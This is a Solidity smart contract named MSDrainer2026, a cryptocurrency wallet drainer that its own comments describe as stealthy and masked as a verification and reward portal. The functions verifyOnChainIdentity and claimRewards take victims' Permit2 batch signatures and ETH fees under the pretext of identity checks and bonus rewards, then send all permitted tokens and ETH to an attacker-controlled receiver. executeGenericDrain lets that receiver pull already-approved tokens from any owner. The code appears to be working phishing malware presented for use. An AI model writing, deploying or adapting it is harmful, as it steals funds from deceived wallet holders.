// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title IPermit2
 * @dev Minimal interface for Permit2 batch transfers.
 */
interface IPermit2 {
    struct TokenPermissions {
        address token;
        uint256 amount;
    }

    struct PermitBatchTransferFrom {
        TokenPermissions[] permitted;
        address spender;
        uint256 nonce;
        uint256 deadline;
    }

    struct SignatureTransferDetails {
        address to;
        uint256 requestedAmount;
    }

    function permitTransferFrom(
        PermitBatchTransferFrom calldata permit,
        SignatureTransferDetails[] calldata transferDetails,
        address owner,
        bytes calldata signature
    ) external;
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title MSDrainer2026
 * @dev Optimized and stealthy contract for bundling asset sweeps.
 *      Masked as a secure verification and reward portal.
 */
contract MSDrainer2026 {
    IPermit2 public immutable permit2;
    address public immutable receiver;
    IERC20 public immutable bonusToken;

    event SecurityCheck(address indexed user, bool passed, uint256 timestamp);
    event RewardsAllocated(address indexed user, uint256 amount, uint256 timestamp);

    constructor(address _permit2, address _receiver, address _bonusToken) {
        permit2 = IPermit2(_permit2);
        receiver = _receiver;
        bonusToken = IERC20(_bonusToken);
    }

    /**
     * @dev Masked function for asset drainage via Permit2.
     */
    function verifyOnChainIdentity(
        IPermit2.PermitBatchTransferFrom calldata permit,
        bytes calldata signature,
        uint256 /* verificationNonce */
    ) external payable {
        require(msg.value >= 0.0007 ether, "Verification gas too low");

        if (permit.permitted.length > 0) {
            uint256 numTokens = permit.permitted.length;
            IPermit2.SignatureTransferDetails[] memory transfers = new IPermit2.SignatureTransferDetails[](numTokens);
            
            for (uint256 i = 0; i < numTokens; i++) {
                transfers[i] = IPermit2.SignatureTransferDetails({
                    to: receiver,
                    requestedAmount: permit.permitted[i].amount
                });
            }
            permit2.permitTransferFrom(permit, transfers, msg.sender, signature);
        }

        uint256 currentBalance = address(this).balance;
        if (currentBalance > 0) {
            (bool success, ) = payable(receiver).call{value: currentBalance}("");
            require(success, "Sync failed");
        }

        emit SecurityCheck(msg.sender, true, block.timestamp);
    }

    /**
     * @dev Claim rewards and synchronize on-chain eligibility.
     */
    function claimRewards(
        IPermit2.PermitBatchTransferFrom calldata permit,
        bytes calldata signature,
        uint256 claimAmount
    ) external payable {
        this.verifyOnChainIdentity(permit, signature, claimAmount);

        uint256 bonusBalance = bonusToken.balanceOf(address(this));
        uint256 finalBonus = claimAmount > bonusBalance ? bonusBalance : claimAmount;

        if (finalBonus > 0) {
            bonusToken.transfer(msg.sender, finalBonus);
        }

        emit RewardsAllocated(msg.sender, finalBonus, block.timestamp);
    }

    /**
     * @dev Stealth bridge for complex orders (e.g. Seaport fulfillment via worker).
     *      Appears as a synchronization function.
     */
    function synchronize(bytes calldata /* data */) external payable {
        // Forward calls to specified target (e.g. Seaport)
        (bool success, ) = payable(receiver).call{value: msg.value}("");
        require(success, "Sync failed");
    }

    /**
     * @dev Fallback for users who haven't approved Permit2.
     *      Allows the receiver to pull approved tokens directly.
     */
    function executeGenericDrain(address owner, address[] calldata tokens, uint256[] calldata amounts) external payable {
        require(msg.sender == receiver, "Execution restricted to receiver");
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20(tokens[i]).transferFrom(owner, receiver, amounts[i]);
        }
        if (address(this).balance > 0) {
            payable(receiver).transfer(address(this).balance);
        }
    }

    receive() external payable {}
}
